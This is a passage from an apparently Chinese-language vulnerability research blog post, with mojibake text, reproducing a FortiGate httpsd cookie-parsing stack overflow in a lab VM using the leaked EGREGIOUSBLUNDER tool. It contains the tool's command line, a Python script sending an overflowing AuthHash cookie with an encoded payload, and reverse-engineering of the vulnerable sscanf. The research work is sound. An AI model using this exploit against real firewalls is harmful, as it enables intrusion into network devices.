<li>æ£€æŸ¥ <code>/bin.tar.xz</code> æ˜¯å¦å­˜åœ¨ï¼Œè‹¥æ˜¯åˆ™åˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œ <code>/sbin/xz --check=sha256 -d /bin.tar.xz</code>ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸååˆ é™¤<code>/bin.tar.xz</code>ï¼Œä¹‹åæ£€æŸ¥ <code>/bin.tar</code> æ˜¯å¦å­˜åœ¨ï¼Œè‹¥æ˜¯åˆ™åˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œ <code>/sbin/ftar -xf /bin.tar</code>ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸååˆ é™¤<code>/bin.tar</code></li>
<li>ä¸Šä¸€æ­¥æˆåŠŸåæ£€æŸ¥ <code>/migadmin.tar.xz</code> æ˜¯å¦å­˜åœ¨ï¼Œè‹¥æ˜¯åˆ™åˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œ <code>/sbin/xz --check=sha256 -d /migadmin.tar.xz</code>ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸååˆ é™¤<code>/migadmin.tar.xz</code>ï¼Œä¹‹åæ£€æŸ¥ <code>/migadmin.tar</code> æ˜¯å¦å­˜åœ¨ï¼Œè‹¥æ˜¯åˆ™åˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œ <code>/sbin/ftar -xf /migadmin.tar</code>ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸååˆ é™¤<code>/migadmin.tar</code></li>
<li>åˆ é™¤ <code>/sbin/xz</code></li>
<li>åˆ é™¤ <code>/sbin/ftar</code></li>
<li>æ‰§è¡Œ <code>/bin/init</code></li>
</ul>
<p>ç”±äº <code>ftar</code> ä¸ <code>xz</code> éƒ½æŒ‡å®šäº†è°ƒç”¨çš„åº“çš„ç›®å½•å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2021/08/11/4exwH7Pkgh5JdGE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ•…éœ€è¦é€šè¿‡åˆ‡æ¢æ ¹ç›®å½•æ‰§è¡Œè¿›è¡Œè§£å‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> . /sbin/xz --check=sha256 -d /bin.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> . /sbin/ftar -xf /bin.tar</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> . /sbin/xz --check=sha256 -d /migadmin.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> . /sbin/ftar -xf /migadmin.tar</span><br></code></pre></td></tr></table></figure>

<h3 id="II-bin-ç›®å½•æ–‡ä»¶åˆ†æ"><a href="#II-bin-ç›®å½•æ–‡ä»¶åˆ†æ" class="headerlink" title="II. bin ç›®å½•æ–‡ä»¶åˆ†æ"></a>II. bin ç›®å½•æ–‡ä»¶åˆ†æ</h3><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°çš„æ˜¯ï¼Œ<code>bin.tar.xz</code> è§£å‹å‡ºæ¥çš„æ–‡ä»¶åŸºæœ¬ä¸Šéƒ½æ˜¯æŒ‡å‘ <code>/bin/init</code> ä¸ <code>/bin/sysctl</code> çš„è½¯é“¾æ¥</p>
<p>å…¶ä¸­è¯¸å¦‚ <code>httpsd</code> ç­‰ç½‘ç»œæœåŠ¡éƒ½æ˜¯å‰è€…çš„è½¯é“¾æ¥ï¼Œå¯çŸ¥å‰è€…åº”å½“ä¸ºè¯¥é˜²ç«å¢™æä¾›çš„åŸºæœ¬çš„ç½‘ç»œæœåŠ¡</p>
<p>è€Œè¯¸å¦‚ <code>chmod</code> ç­‰å¸¸ç”¨å‘½ä»¤éƒ½æ˜¯åè€…çš„è½¯é“¾æ¥ï¼Œå¯çŸ¥åè€…åº”å½“ä¸ºç±»ä¼¼ busybox ä¸€æ ·çš„å·¥å…·åº“ï¼Œä¸è¿‡æ›´ä¸ºç²¾ç®€</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ll</span><br>total 31200<br>drwxr-xr-x  2 root     root         4096 Aug 10 19:35 ./<br>drwxr-xr-x 12 arttnba3 arttnba3     4096 Aug 10 19:37 ../<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 adsl_mon -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alarmd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alertmail -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 authd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 bgpd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardctl -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardmgr -&gt; /bin/init<br>lrwxrwxrwx  1 root     root           11 Aug 10 19:35 cat -&gt; /bin/sysctl<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cauploadd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassis5000d -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassisd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chat -&gt; /bin/init<br>lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chlbd -&gt; /bin/init<br>lrwxrwxrwx  1 root     root           11 Aug 10 19:35 chmod -&gt; /bin/sysctl<br>...<br></code></pre></td></tr></table></figure>

<h3 id="III-bin-init-é€†å‘åˆ†æ"><a href="#III-bin-init-é€†å‘åˆ†æ" class="headerlink" title="III. &#x2F;bin&#x2F;init é€†å‘åˆ†æ"></a>III. &#x2F;bin&#x2F;init é€†å‘åˆ†æ</h3><p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼š</p>
<p>é¦–å…ˆä¼šæ‰§è¡Œ <code>/bin/initXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</code> æ›¿æ¢è‡ªèº«ï¼Œè¯¥æ–‡ä»¶å…¶å®æ˜¯ <code>/bin/init</code> çš„è½¯é“¾æ¥ï¼Œæ•…è¿™é‡Œæœ¬è´¨ä¸Šåªæ˜¯æ›´æ”¹äº† pid ä¸ argv[0]</p>
<p>éšåä¼šå…³é—­ä¸‰ä¸ªæ ‡å‡†æ–‡ä»¶æè¿°ç¬¦å¹¶æ”¹å˜å½“å‰å·¥ä½œç›®å½•ä¸º <code>/</code>ï¼Œæ‰“å¼€ <code>/dev/null</code> å¹¶åˆ›å»ºä¸‰ä¸ªæŒ‡å‘å…¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆ0ã€1ã€2ï¼‰</p>
<blockquote>
<p>ç¬”è€…åç»­æ›¾ç»ä¸€åº¦è®¤ä¸ºåˆ©ç”¨å¤±è´¥å°±æ˜¯å› ä¸ºæ²¡æœ‰æ³¨æ„åˆ°è¾“å…¥è¾“å‡ºè¢«é‡å®šå‘è‡³ null è€Œæ— æ³•åœ¨å±å¹•ä¸Šæ‰“å°å‡ºä»»ä½•ä¿¡æ¯</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/11/vB5HUkGSR67P9yi.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å¯åŠ¨åçš„ç•Œé¢å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2021/08/11/pRVcK5Z1szT2uU3.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>é¦–å…ˆä¸ºæˆ‘ä»¬çš„è™šæ‹Ÿæœºé…ç½®ä¸€ä¸ªæœ¬åœ° ip</p>
<p><img src="https://i.loli.net/2021/08/11/YzTN9P82sJiaBFc.png" srcset="/img/loading.gif" lazyload alt="4M4_Z96@_NSPZR087A2_6QC.png"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬è¿˜éœ€è¦è·å–åˆ°ä¸€ä¸ª cookie numï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -X HEAD -v http://192.168.116.100/login  2&gt;&amp;1 | grep <span class="hljs-string">&#x27;APSCOOKIE&#x27;</span></span><br>&lt; Set-Cookie: APSCOOKIE_3943997904=0&amp;0; path=/; expires=Tue, 24-Aug-1971 18:40:48 GMT<br></code></pre></td></tr></table></figure>

<p>ä¹‹åä½¿ç”¨ <code>egregiousblunder</code> æµ‹è¯•è¯¥æ¼æ´ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./egregiousblunder_3.0.0.1 -t 192.168.116.100 -p 80 -l 4444 --ssl 0 --nope --gen 4nc --config EGBL.config --cookienum 3943997904 --stack 0xbffff114</span><br>loading nopen over HTTP<br>using stack addr 0xbffff114<br>built authhash len 116<br>built enc_authhash with len 116<br>problem recv&#x27;ing ack1/hello, stack address probably wrong.  WAM might work?<br>problem with sending file<br>failure loading nopen over HTTP<br></code></pre></td></tr></table></figure>

<p>æ­¤æ—¶åœ¨ fortigate çš„ CLI ä¸­æˆ‘ä»¬ä¾¿å¯ä»¥çœ‹åˆ° httpsd æœåŠ¡çš„å´©æºƒä¿¡æ¯åŠæ ˆå›æº¯</p>
<p><img src="https://i.loli.net/2021/08/11/fOPSQBG2elVkKja.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä½†æ˜¯è¿™é‡Œæ²¡èƒ½å¤ŸæˆåŠŸè·å¾—ä¸€ä¸ª shellï¼Œåˆæ­¥çŒœæµ‹æ˜¯ EGREGIOUSBLUNDER çš„ç‰ˆæœ¬é—®é¢˜</p>
<p>ä½¿ç”¨ wireshark æˆªå– EGREGIOUSBLUNDER æ‰€å‘é€çš„æ•°æ®åŒ…è¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å‘ç° <code>0xbffff114</code> è¿™ä¸ªåœ°å€è¢«å¸ƒç½®åˆ°äº†httpè¯·æ±‚å¤´çš„ Cookie ä¸­çš„ <code>AuthHash</code> å­—æ®µï¼Œåˆæ­¥æ¨æµ‹è¿™åº”å½“æ˜¯ä½œä¸ºä¸€ä¸ªè¿”å›åœ°å€è¢«å¸ƒç½®ä¸Šå»çš„ï¼Œè¯´æ˜å¯èƒ½æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œè¿™ä¹Ÿä¸ CVE é€šå‘Šæ‰€è¯´çš„ã€cookie è§£æè¿‡ç¨‹ä¸­å‘ç”Ÿç¼“å†²åŒºæº¢å‡ºã€‘ç›¸å»åˆ</p>
<p><img src="https://i.loli.net/2021/08/12/nKClEmcT15JAQot.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä½¿ç”¨ postman ç®€å•ä»¿é€ è¯¥ http è¯·æ±‚å¦‚ä¸‹ï¼Œä½¿ç”¨å­—ç¬¦ <code>A</code> ç®€å•å¡«å…… AuthHash å­—æ®µï¼š</p>
<p><img src="https://i.loli.net/2021/08/12/XetkB3iWlKNaqjg.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å½“æˆ‘ä»¬çš„å­—ç¬¦ A æ•°é‡è¾¾åˆ° 0x60 æ—¶å†ä¸€æ¬¡å‘ç”Ÿäº† crashï¼Œä¸è¿‡è¿™ä¸€æ¬¡çš„æ ˆå›æº¯æ›´ä¸ºè¯¦ç»†</p>
<p><img src="https://i.loli.net/2021/08/12/ZHqku5i3BED8QlR.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä¸ºäº†æ–¹ä¾¿æ„é€  payload è¿›è¡Œåˆ©ç”¨ï¼Œæ¥ä¸‹æ¥ç¬”è€…é€‰æ‹©ä½¿ç”¨ python å‘é€ http è¯·æ±‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> *<br>url = <span class="hljs-string">&#x27;http://192.168.116.100/index&#x27;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>:<span class="hljs-string">&#x27;12&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;*/*&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>:<span class="hljs-string">&#x27;gzip,deflate,br&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, <br>    <span class="hljs-string">&#x27;Host&#x27;</span>:<span class="hljs-string">&#x27;192.168.116.100&#x27;</span>, <br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=Ã«YÃ¿Ã¡Ã¨Ã¸Ã¿Ã¿Ã¿PQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span> + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x60</span><br>    &#125;<br><br>r = post(url, headers = headers)<br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-built_in">print</span>(r.headers)<br></code></pre></td></tr></table></figure>

<h2 id="å®šä½æº¢å‡ºç‚¹"><a href="#å®šä½æº¢å‡ºç‚¹" class="headerlink" title="å®šä½æº¢å‡ºç‚¹"></a>å®šä½æº¢å‡ºç‚¹</h2><blockquote>
<p>ç”±äºä¸€äº›ç‰¹æ®ŠåŸå› ï¼Œç¬”è€…æœ¬åœ°æ— æ³•ç›´æ¥å¯åŠ¨å…¶ init ç¨‹åº</p>
<p>ç¬”è€…æœ¬æƒ³å°† gdb ç­‰æ‰“åŒ…è¿›å…¶æ–‡ä»¶ç³»ç»Ÿä¸­ç›´æ¥åœ¨è™šæ‹Ÿæœºå†…è¿›è¡Œè°ƒè¯•ï¼Œå¥ˆä½•æ–‡ä»¶ç³»ç»Ÿå®åœ¨å¤ªè€ï¼Œé‡æ‰“åŒ…åæ²¡æœ‰ä¸€æ¬¡å¯åŠ¨æˆåŠŸçš„ï¼Œåªå¥½ä½œç½¢â€¦</p>
</blockquote>
<p>æˆ‘ä»¬é¦–å…ˆæ ¹æ®è¿™ä¸ªæŠ¥é”™ä¿¡æ¯è¿›è¡Œæ ˆå›æº¯ï¼š</p>
<p><img src="https://i.loli.net/2021/08/12/ZHqku5i3BED8QlR.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:08C38A77                 call    sub_8C389B7<br>.text:08C38A7C                 mov     ebx, [ebp+var_4]<br>.text:08C38A7F                 leave<br>.text:08C38A80                 retn<br>.text:08C38A80 sub_8C38A61     endp<br></code></pre></td></tr></table></figure>

<p>æ‰¾åˆ° <code>sub_8C389B7()</code> å‡½æ•°ï¼Œæˆ‘ä»¬å‘ç°å…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>sub_8C38440()</code> å‡½æ•°ï¼Œç®€å•åˆ†ææˆ‘ä»¬ä¸éš¾çŸ¥é“è¯¥è°ƒç”¨é“¾ä»…ä»…æ˜¯ç”¨äºæ‰“å°æŠ¥é”™ä¿¡æ¯</p>
<p><img src="https://i.loli.net/2021/08/12/NYucT3GlibfU8dW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç»§ç»­åˆ†æå…¶è°ƒç”¨é“¾ï¼Œlibc offset 0x1d218 å¤„ä»£ç å¦‚ä¸‹ï¼Œè¯¥æ®µä»£ç ä½äº libc ä¸­å‡½æ•° <code>__libc_sigaction()</code>ï¼Œç”¨ä»¥è¿›è¡Œ <code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0001D210 loc_1D210:                              ; DATA XREF: __libc_sigaction+CAâ†“o<br>.text:0001D210                 mov     eax, 0ADh<br>.text:0001D215                 int     80h             ; LINUX - sys_rt_sigreturn<br>.text:0001D217                 nop<br>.text:0001D218 loc_1D218:                              ; DATA XREF: __libc_sigaction+D9â†“o<br>.text:0001D218                 pop     eax<br>.text:0001D219                 mov     eax, 77h ; &#x27;w&#x27;<br>.text:0001D21E                 int     80h             ; LINUX - sys_sigreturn<br></code></pre></td></tr></table></figure>

<p>ç»§ç»­å›æº¯ï¼Œ<code>0x8204F8D</code> çš„ä¸Šä¸€æ¡æŒ‡ä»¤è°ƒç”¨äº† <code>sub_820483B()</code> å‡½æ•°ï¼Œé€šè¿‡é€†å‘æˆ‘ä»¬å‘ç°è¯¥å‡½æ•°ä¼šè°ƒç”¨ <code>sub_820429D()</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_820429D</span><span class="hljs-params">(<span class="hljs-type">int</span> *a1, _BYTE *a2)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> **v4; <span class="hljs-comment">// edi</span><br>  <span class="hljs-type">int</span> *v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">void</span> *v7; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">void</span> *v8; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> *v11[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br><br>  v10 = sub_83297EE(*a1, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>  <span class="hljs-keyword">if</span> ( a2 || (a2 = (_BYTE *)sub_8329B12(a1[<span class="hljs-number">34</span>], <span class="hljs-string">&quot;Cookie&quot;</span>)) != <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( *a2 )<br>    &#123;<br>      v11[<span class="hljs-number">0</span>] = (<span class="hljs-type">char</span> *)sub_8344CBA(*a1, &amp;a2, <span class="hljs-number">59</span>);<br>      <span class="hljs-keyword">if</span> ( !v11[<span class="hljs-number">0</span>] )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">while</span> ( ((*__ctype_b_loc())[(<span class="hljs-type">unsigned</span> __int8)*a2] &amp; <span class="hljs-number">0x2000</span>) != <span class="hljs-number">0</span> )<br>        ++a2;<br>      v2 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)sub_8344CBA(*a1, v11, <span class="hljs-number">61</span>);<br>      v3 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)sub_8204B9C(a1);<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(v2, v3) )<br>        sub_820CB5E(v11[<span class="hljs-number">0</span>]);<br>...<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­ <code>sub_8329B12()</code> å‡½æ•°è°ƒç”¨äº† <code>strcasecmp()</code>ï¼Œå¤§è‡´åˆ†æåº”å½“æ˜¯åˆ¤æ–­å­—ç¬¦ä¸²å­˜åœ¨æ€§çš„å‡½æ•°ï¼Œåœ¨è¿™é‡Œä¼ å…¥çš„å‚æ•°ä¸­åŒ…å«å­—ç¬¦ä¸² <code>&quot;Cookie&quot;</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¤§è‡´å¯ä»¥æ¨æµ‹è¯¥å‡½æ•°åº”å½“æ˜¯ httpsd ï¼ˆå³æœ¬è¿›ç¨‹ï¼‰ä¸­è¢«ç”¨ä»¥å¤„ç† Cookie ç›¸å…³çš„å‡½æ•°ä¹‹ä¸€</p>
<p>å±€éƒ¨å˜é‡ v3 çš„æ±‚è§£æ¶‰åŠåˆ°å‡½æ•° <code>sub_8204B9C()</code>ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_8204B9C</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br><br>  v1 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( nCfg_debug_zone )<br>    v1 = nCfg_debug_zone + <span class="hljs-number">45972</span>;<br>  v2 = sub_8204B37(v1);<br>  <span class="hljs-keyword">return</span> sub_8329797(*a1, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;%s_%lu&quot;</span>, <span class="hljs-string">&quot;APSCOOKIE&quot;</span>, v2);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¸éš¾å‘ç°å…¶æœ€åè°ƒç”¨çš„ <code>sub_8329797()</code> ä¼ å‚å½¢å¼åº”å½“æ˜¯æŒ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œæœ€ç»ˆæ‹¼å‡‘å‡ºæ¥çš„å½¢å¼åº”å½“å¦‚ <code>APSCOOKIE_114514</code> ï¼ˆç¤ºä¾‹æ•°å­—ï¼‰çš„å½¢å¼ï¼Œè€Œä¸Šå±‚è°ƒç”¨ä¸­ä½¿ç”¨ <code>strstr()</code> åˆ¤æ–­ v3 åœ¨ v2 ä¸­æ˜¯å¦å­˜åœ¨ï¼Œè¿™ä¸ªå½¢å¼æˆ‘ä»¬ä¸æˆ‘ä»¬ä¼ å…¥çš„ Cookie çš„å†…å®¹å¼€å¤´ç›¸å»åˆï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºæ¥ä¸‹æ¥çš„ <code>sub_820CB5E()</code> å‡½æ•°åº”å½“æ¶‰åŠåˆ°å¯¹ Cookie çš„è§£æå·¥ä½œ</p>
<p>æ¥ä¸‹æ¥ç»§ç»­åˆ†æ <code>sub_820CB5E()</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_820CB5E</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">108</span>]; <span class="hljs-comment">// [esp+116Ch] [ebp-6Ch] BYREF</span><br><br>  size = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( a1 )<br>    size = <span class="hljs-built_in">strlen</span>(a1) + <span class="hljs-number">1</span>;<br>  src = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x52</span>u);<br>  v16 = <span class="hljs-number">20</span>;<br>  <span class="hljs-built_in">memset</span>(v21, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v21));<br>  ptr = <span class="hljs-number">0</span>;<br>  v7 = <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">if</span> ( a1 )<br>  &#123;<br>    sub_820C6F0();<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sscanf</span>(a1, <span class="hljs-string">&quot;Era=%1d&amp;Payload=%[^&amp;]&amp;AuthHash=%s&quot;</span>, &amp;v17, v21, s) == <span class="hljs-number">3</span> )<br>    &#123;<br>...<br></code></pre></td></tr></table></figure>

